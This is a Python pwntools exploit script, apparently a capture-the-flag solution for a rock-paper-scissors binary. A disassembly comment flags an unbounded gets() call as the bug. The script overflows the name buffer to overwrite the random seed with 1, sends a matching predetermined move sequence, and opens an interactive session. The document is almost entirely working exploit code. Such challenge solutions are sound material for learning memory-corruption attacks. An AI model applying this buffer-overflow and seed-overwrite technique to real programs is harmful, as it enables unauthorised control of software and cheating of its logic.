#!/usr/bin/env python2.7
# coding: UTF-8

from pwn import *

'''
0x0000000000400825 <+31>:  lea    rax,[rbp-0x20]                 # rbp-0x20 = seed
0x0000000000400829 <+35>:  mov    rcx,rdx
0x000000000040082c <+38>:  mov    edx,0x1
0x0000000000400831 <+43>:  mov    esi,0x4
0x0000000000400836 <+48>:  mov    rdi,rax
0x0000000000400839 <+51>:  call   0x400650 <fread@plt>
0x000000000040083e <+56>:  mov    rax,QWORD PTR [rbp-0x18]
0x0000000000400842 <+60>:  mov    rdi,rax
0x0000000000400845 <+63>:  call   0x400660 <fclose@plt>
0x000000000040084a <+68>:  mov    edi,0x400b97
0x000000000040084f <+73>:  mov    eax,0x0
0x0000000000400854 <+78>:  call   0x400670 <printf@plt>
0x0000000000400859 <+83>:  mov    rax,QWORD PTR [rip+0x200a60]        # 0x6012c0 <stdout@@GLIBC_2.2.5>
0x0000000000400860 <+90>:  mov    rdi,rax
0x0000000000400863 <+93>:  call   0x4006e0 <fflush@plt>
0x0000000000400868 <+98>:  lea    rax,[rbp-0x50]                 # rbp-0x50 = name
0x000000000040086c <+102>: mov    rdi,rax
0x000000000040086f <+105>:   call   0x4006d0 <gets@plt>          # vuln
'''

r = process('./rps')
buf = 'a' * 0x30 # name
buf += p64(1) # seed

print r.recv()

print "Sending: " + str(buf)
r.send(str(buf) + "\n")

print r.recv()

r.send('SSPSRSSPPSRSRSRSPPSSRRPPRRRSSSRPPPRPSSSSPPPRRSRRRP')

print r.recv()

r.interactive()
